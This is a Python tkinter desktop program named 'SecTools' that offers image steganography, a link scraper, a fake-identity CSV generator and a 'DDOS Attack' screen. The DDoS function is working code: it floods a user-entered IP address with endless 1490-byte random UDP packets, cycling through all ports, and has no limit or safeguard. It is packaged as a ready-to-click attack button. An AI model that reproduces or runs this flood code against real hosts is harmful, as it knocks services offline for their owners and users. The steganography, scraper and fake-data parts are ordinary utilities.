import tkinter
from tkinter import font
from tkinter import *
import os
from faker import Faker
import csv
import socket
import random
import webbrowser
import sys
import scapy.all as scapy 
from subprocess import call
from PIL import Image
import requests
from bs4 import BeautifulSoup

#steganography-----------------------------------------------------------------------------------------------------------------------------------------------------------
def stegpressed():
        labelimage.destroy()
        labeltext.destroy()
        btnfake.destroy()
        btnddos.destroy()
        btnsteg.destroy()
        btnurl.destroy()
        link.destroy()
        steginterface()

        

def steginterface():
    global logo,e6,e7,e8,imgph,e9,imgdec,imghome,btnencode,btndecode,labeltext4,labeltext5,labeltext3,btnback
    logo = PhotoImage(file="logo.png") 

    labelimage = Label(
        root,
        image=logo,
        background="#ffffff",
        borderwidth=0,
        bg = "#343434"
        
    )
    labelimage.pack(pady=(0, 0))

    labeltext = Label(
        root,
        text="DDOS Attack",
        font=("Apple LiGothic", 30),
        background="#343434",
        foreground="#00FFC9",
        

    )
    
    e6= Entry(root,relief=RIDGE,fg='#00FFC9',bg='#343434')
    e6.insert(0,"Img Name With Extension")
    e6.pack(pady=(0, 20))

    e7= Entry(root,relief=RIDGE,fg='#00FFC9',bg='#343434')
    e7.insert(0,"Text To Be Encoded")
    e7.pack(pady=(0, 20)) 
    
    e8= Entry(root,relief=RIDGE,fg='#00FFC9',bg='#343434')
    e8.insert(0,"New Img Name")
    e8.pack(pady=(0, 20)) 
    
    imgph = PhotoImage(file="encode.png")
    btnencode= Button(
        root,
        image=imgph,
        relief=FLAT,
        border=0,
        highlightbackground = "#343434",
        command=encode,

        )
    btnencode.pack(pady=(0,10))
    
    labeltext4 = Label(
        root,
        text="Note: The image to be encoded should be in the current working directory",
        font=("Apple LiGothic", 10,"bold"),
        background="#00FFC9",
        foreground="#343434",
        

    )  
    labeltext4.pack(pady=(0, 0))
    labeltext5 = Label(
        root,
        text="Encoded image will also be saved in the cwd",
        font=("Apple LiGothic", 10,"bold"),
        background="#00FFC9",
        foreground="#343434",
        

    )  
    labeltext5.pack(pady=(0, 40))
    
    
    e9= Entry(root,relief=RIDGE,fg='#00FFC9',bg='#343434')
    e9.insert(0,"Img Name With Extension")
    e9.pack(pady=(0, 20)) 
    
    imgdec = PhotoImage(file="decode.png")
    btndecode= Button(
        root,
        image=imgdec,
        relief=FLAT,
        border=0,
        highlightbackground = "#343434",
        command=main,
        )
    btndecode.pack(pady=(0,20))
    
    labeltext3 = Label(
        root,
        text="Note: The decoded text will be stored in decoded_text.txt file in the current working directory",
        font=("Apple LiGothic", 10,"bold"),
        background="#00FFC9",
        foreground="#343434",
        

    )  
    labeltext3.pack(pady=(0, 15))


def genData(data):
        newd = []

        for i in data:
            newd.append(format(ord(i), '08b'))
        return newd

def modPix(pix, data):

    datalist = genData(data)
    lendata = len(datalist)
    imdata = iter(pix)

    for i in range(lendata):

        # Extracting 3 pixels at a time
        pix = [value for value in imdata.__next__()[:3] +
                                imdata.__next__()[:3] +
                                imdata.__next__()[:3]]

        # Pixel value should be made
        # odd for 1 and even for 0
        for j in range(0, 8):
            if (datalist[i][j] == '0' and pix[j]% 2 != 0):
                pix[j] -= 1

            elif (datalist[i][j] == '1' and pix[j] % 2 == 0):
                if(pix[j] != 0):
                    pix[j] -= 1
                else:
                    pix[j] += 1
                # pix[j] -= 1

        # Eighth pixel of every set tells
        # whether to stop ot read further.
        # 0 means keep reading; 1 means thec
        # message is over.
        if (i == lendata - 1):
            if (pix[-1] % 2 == 0):
                if(pix[-1] != 0):
                    pix[-1] -= 1
                else:
                    pix[-1] += 1

        else:
            if (pix[-1] % 2 != 0):
                pix[-1] -= 1

        pix = tuple(pix)
        yield pix[0:3]
        yield pix[3:6]
        yield pix[6:9]

def encode_enc(newimg, data):
    w = newimg.size[0]
    (x, y) = (0, 0)

    for pixel in modPix(newimg.getdata(), data):

        # Putting modified pixels in the new image
        newimg.putpixel((x, y), pixel)
        if (x == w - 1):
            x = 0
            y += 1
        else:
            x += 1


def encode():
    img = e6.get()
    image = Image.open(img, 'r')

    data = e7.get()
    if (len(data) == 0):
        raise ValueError('Data is empty')

    newimg = image.copy()
    encode_enc(newimg, data)

    new_img_name = e8.get()
    newimg.save(new_img_name, str(new_img_name.split(".")[1].upper()))


def decode():
    img = e9.get()
    image = Image.open(img, 'r')

    data = ''
    imgdata = iter(image.getdata())

    while (True):
        pixels = [value for value in imgdata.__next__()[:3] +
                                imgdata.__next__()[:3] +
                                imgdata.__next__()[:3]]

        # string of binary data
        binstr = ''

        for i in pixels[:8]:
            if (i % 2 == 0):
                binstr += '0'
            else:
                binstr += '1'

        data += chr(int(binstr, 2))
        if (pixels[-1] % 2 != 0):
            return data

def main():
    j=decode()         
    textfile = open("decoded_text.txt", "w")
    textfile.write("Decoded Text:"+j)
    textfile.close()





#steganography end-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#DDOS tool---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def ddospressed():
        labelimage.destroy()
        labeltext.destroy()
        btnfake.destroy()
        link.destroy()
        btnddos.destroy()
        btnsteg.destroy()
        btnurl.destroy()
        ddosinterface()

def ddosinterface():
    global logo,imgh,lst,e2,e3,imgv
    logo = PhotoImage(file="logo.png") 

    labelimage = Label(
        root,
        image=logo,
        background="#ffffff",
        borderwidth=0,
        bg = "#343434",
        
    )
    labelimage.pack(pady=(0, 0))

    labeltext = Label(
        root,
        text="DDOS Attack",
        font=("Apple LiGothic", 30),
        background="#343434",
        foreground="#00FFC9",
        

    )
    
    
    labeltext.pack(pady=(0, 15))
    imgh = PhotoImage(file="scan.png")
    btnscan= Button(
        root,
        image=imgh,
        relief=FLAT,
        border=0,
        highlightbackground = "#343434",
        command=runscan,
  
        )
    btnscan.pack(pady=(0,20))
    
    e2 = Entry(root,relief=RIDGE,fg='#00FFC9',bg='#343434')
    e2.insert(0,"Enter Target's IP")
    e2.pack(pady=(0, 20))
    
    e3 = Entry(root,relief=RIDGE,fg='#00FFC9',bg='#343434')
    e3.insert(0,"Enter Port No.")
    e3.pack(pady=(0, 20))
    
    imgv = PhotoImage(file="attack.png")
    btnattack= Button(
        root,
        image=imgv,
        relief=FLAT,
        border=0,
        highlightbackground = "#343434",
        command=ddosattack,

        )
    btnattack.pack(pady=(0,20))

def runscan():
    call(["python", "scanner.py"])

def ddosattack():
    global e2,e3
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    os.system("clear")
    ipaddress = e2.get()
    port_no = int(e3.get())
    os.system("clear")
    sent_packet = 0
    while True:
         sock.sendto(bytes, (ipaddress,port_no))
         sent_packet = sent_packet + 1
         port_no = port_no + 1
         print ("Sent %s packets to %s throught port:%s"%(sent_packet,ipaddress,port_no))
         if port_no == 65534:
           port_no = 1

#END DDOS tool-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#URL scraper----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
def urlpressed():
        labelimage.destroy()
        labeltext.destroy()
        btnfake.destroy()
        btnddos.destroy()
        btnsteg.destroy()
        btnurl.destroy()
        link.destroy()
        urlscraperinterface()
def urlscraperinterface():
    global logo,e4,imgl,lst2
    logo = PhotoImage(file="logo.png") 

    labelimage = Label(
        root,
        image=logo,
        background="#ffffff",
        borderwidth=0,
        bg = "#343434"
        
    )
    labelimage.pack(pady=(0, 0))

    labeltext = Label(
        root,
        text="URL Scraper",
        font=("Apple LiGothic", 30),
        background="#343434",
        foreground="#00FFC9",
        

    )  
    labeltext.pack(pady=(0, 15))


    labeltext = Label(
        root,
        text="Enter Website:",
        font=("Apple LiGothic", 17),
        background="#343434",
        foreground="#00FFC9",
        

    )  
    labeltext.pack(pady=(0, 15))


    e4 = Entry(root,relief=RIDGE,fg='#00FFC9',bg='#343434')
    e4.insert(0,"https://www.netflix.com/")
    e4.pack(pady=(0, 20))
    
    
    imgl = PhotoImage(file="scrape.png")
    btnscrape= Button(
        root,
        image=imgl,
        relief=FLAT,
        border=0,
        highlightbackground = "#343434",
        command=urlscrape,

        )
    btnscrape.pack(pady=(0,20))
    
    labeltext2 = Label(
        root,
        text="Note: The scraped urls will be stored in scraped_urls.txt file in the project directiory",
        font=("Apple LiGothic", 10,"bold"),
        background="#00FFC9",
        foreground="#343434",
        

    )  
    labeltext2.pack(pady=(0, 15))
   
def urlscrape():
    url = e4.get()
    reqs = requests.get(url)
    soup = BeautifulSoup(reqs.text, 'html.parser')
    urls = []
    lst2=[]
    for link in soup.find_all('a'):
        j=link.get('href')
        lst2.append(j)
    print(lst2)
    k=" ".join(str(x) for x in lst2)
    textfile = open("scraped_urls.txt", "w")
    textfile.write(k)
    textfile.close()

#END URL scraper----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#fake info generator----------------------------------------------------------------------------------------------------------------------------
def fakepressed():
    labelimage.destroy()
    labeltext.destroy()
    btnfake.destroy()
    btnddos.destroy()
    btnsteg.destroy()
    btnurl.destroy()
    link.destroy()
    fakeinfo()
    
def fakeinfo():
    global logo,imgz,e1,imga
    fake=Faker()
    logo = PhotoImage(file="logo.png") 

    labelimage = Label(
        root,
        image=logo,
        background="#ffffff",
        borderwidth=0,
        bg = "#343434"
        
    )
    labelimage.pack(pady=(0, 0))

    labeltext = Label(
        root,
        text="Fake Info Generator",
        font=("Apple LiGothic", 30),
        background="#343434",
        foreground="#00FFC9",
        

    )
    labeltext.pack(pady=(0, 15))
 
    e1 = Entry(root,relief=RIDGE,fg='#00FFC9',bg='#343434')
    e1.insert(0,"Enter No. Of Records")
    e1.pack(pady=(0, 20))
    imgz = PhotoImage(file="generate.png")
    btnname= Button(
        root,
        image=imgz,
        text="Generate",
        relief=FLAT,
        border=0,
        highlightbackground = "#343434",
        command=fakefunc,
  
        )
         

    btnname.pack(pady=(0, 15))

    labeltext22 = Label(
        root,
        text="Note: The data will stored in fakeinfo.csv in the project folder",
        font=("Apple LiGothic", 10,"bold"),
        background="#00FFC9",
        foreground="#343434",
        

    )  
    labeltext22.pack()


    
name_data={}    
def fakefunc():
     global e1
     for i in range(0, int(e1.get())):
         fake = Faker()
         name_data[i]={} 
         name_data[i]['name']= fake.name() 
         name_data[i]['address']= fake.address() 
         name_data[i]['email']= str(fake.email())
         name_data[i]['ipv4 address']= str(fake.ipv4())
         name_data[i]['ipv6 address']= str(fake.ipv6())
         name_data[i]['mac address']= str(fake.mac_address())
         name_data[i]['sha256']= str(fake.sha256())
         name_data[i]['md5']= str(fake.md5())
         
         
     
     with open("fakeinfo.csv", 'w', newline='') as f:
         for key in name_data.keys():
             f.write("%s,%s\n"%(key,name_data[key]))



#----------------------------------------------------


#home---------------------------------------------------------------------------------------------------------------------------------------------------
def home():
    global logo, labelimage, labeltext, img2, imgx, imgy, imgq, imgr, btnfake, btnddos, btnsteg, btnurl,link
    logo = PhotoImage(file="logo.png") 

    labelimage = Label(
        root,
        image=logo,
        background="#ffffff",
        borderwidth=0,
        bg = "#343434"
        
    )
    labelimage.pack(pady=(0, 0))

    labeltext = Label(
        root,
        text="SecTools",
        font=("Apple LiGothic", 30),
        background="#343434",
        foreground="#00FFC9",
        

    )
    labeltext.pack(pady=(0, 15))

    img2 = PhotoImage(file="fake.png")
    imgx = PhotoImage(file="phone.png")
    imgy = PhotoImage(file="url.png")
    imgq = PhotoImage(file="steg.png")
    imgr = PhotoImage(file="ddos.png")



    btnfake= Button(
        root,
        image=img2,
        relief=FLAT,
        border=0,
        highlightbackground = "#343434",
        command=fakepressed,
       
       
    )
    btnfake.pack()


    btnurl = Button(
        root,
        image=imgy,
        relief=FLAT,
        border=0,
        background="#343434",
        highlightbackground = "#343434",
        command=urlpressed,
      
    )
    btnurl.pack()

    btnsteg = Button(
        root,
        image=imgq,
        relief=FLAT,
        border=0,
        highlightbackground = "#343434",
        command=stegpressed,
     
    )
    btnsteg.pack()

    btnddos = Button(
        root,
        image=imgr,
        relief=FLAT,
        border=0,
        highlightbackground = "#343434",
        command=ddospressed,
    
    )
    btnddos.pack(pady=(0,40))

   
    def callback(url):
         webbrowser.open_new_tab(url)
   
    link = Label(root, text="Made By: @rishabhchopda ",font=('Verdana 15 underline', 15,'underline'), bg="#343434",fg="#00FFC9", cursor="hand",)
    link.pack()
    link.bind("<Button-1>", lambda e:
    callback("https://rishabhc9.github.io/rishabhchopda/"))
    root.mainloop()

root = tkinter.Tk()
root.title("SecTools")
root.geometry("490x720")
root.config(background="#343434")
root.resizable(height = None, width = None)
root.count1 = 0
root.count2 = 0
root.count3 = 0
home()

